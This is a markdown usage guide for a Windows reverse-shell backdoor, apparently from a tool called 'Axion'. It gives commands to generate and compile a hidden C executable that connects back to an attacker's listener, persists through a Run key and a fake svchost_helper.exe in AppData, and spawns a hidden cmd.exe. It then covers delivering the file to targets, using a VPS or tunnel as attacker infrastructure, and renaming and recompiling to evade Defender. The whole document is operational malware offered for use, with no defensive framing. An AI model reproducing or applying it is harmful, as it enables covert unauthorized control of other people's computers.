
# Windows Backdoor — Professional Usage Guide (Axion)

## 1. Generate

```bash
python3 generate_backdoor.py --lhost YOUR_IP_OR_TUNNEL_HOST --lport 4444 --type all
```

## 2. Compile the professional single EXE (recommended)

```bash
x86_64-w64-mingw32-gcc -o win_backdoor.exe backdoor_payloads/win_backdoor.c -lws2_32 -mwindows -s -O2
```

This single EXE:
- Hides its window
- Copies itself to %APPDATA%\\Microsoft\\Windows\\svchost_helper.exe
- Adds HKCU Run key "WindowsUpdateHelper"
- Reconnects every ~8 seconds
- Spawns hidden cmd.exe

One file. Run once. Persistence automatic.

## 3. Listener

```bash
ncat -lvnp 4444
```

## 4. Delivery

Copy EXE to target and run once. Shell appears. Persistence already done.

## 5. No static IP / home controlling office

Residential IPs change. Use:

A) Cheap VPS with static IP (most professional)
   - Run ncat permanently on the VPS
   - Generate payload with VPS IP
   - Control from anywhere via SSH/tmux to the VPS

B) Free/cheap TCP tunnel service that gives you a public host:port
   - Point --lhost at the tunnel hostname
   - Payload only connects outbound — office IP changes do not matter

C) Cloudflare Tunnel (good for HTTP, more work for raw TCP reverse shells)

Never depend on your home residential IP.

## 6. Why Defender blocked the old .ps1

PowerShell + encoded reverse shell + Run key = heavily signatured.
Solution: use the compiled C EXE. It never drops a .ps1.

## 7. Further reducing detections

- Compile with -s -O2
- Rename EXE (svchost_helper.exe, RuntimeBroker.exe, etc.)
- Change PERSIST_NAME / path strings and recompile
- Let it install to AppData then delete the original dropper
- Use non-default high ports

## 8. Professional workflow

1. Stable endpoint (VPS or TCP tunnel)
2. Generate + compile C payload pointing at it
3. Deliver single EXE, run once
4. Persistence + hidden + reconnect automatic
5. Control from anywhere
